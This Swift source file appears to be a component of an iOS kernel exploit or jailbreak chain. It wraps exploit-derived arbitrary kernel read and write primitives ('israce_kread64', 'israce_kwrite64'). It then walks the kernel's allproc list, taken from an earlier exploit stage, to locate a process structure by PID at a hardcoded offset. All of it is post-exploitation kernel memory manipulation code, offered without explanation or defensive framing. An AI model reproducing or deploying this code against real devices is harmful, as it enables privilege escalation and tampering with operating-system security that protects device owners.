import Foundation

enum KernelRW {

    static func kread64(addr: UInt64) -> UInt64 {
        return israce_kread64(addr)
    }

    static func kwrite64(addr: UInt64, val: UInt64) {
        _ = israce_kwrite64(addr, val)
    }

    static func findProc(pid: Int32) -> UInt64 {
        let allproc = Stage4.lastResult?.allproc ?? 0
        guard allproc != 0 else { return 0 }

        var cur = kread64(addr: allproc)
        for _ in 0..<4096 {
            guard cur >= 0xFFFF_FFE0_0000_0000, cur != 0xFFFF_FFFF_FFFF_FFFF else { break }
            let p_pid = kread64(addr: cur + 0x68)
            if Int32(truncatingIfNeeded: p_pid) == pid {
                return cur
            }
            cur = kread64(addr: cur)
            if cur == 0 { break }
        }
        return 0
    }
}
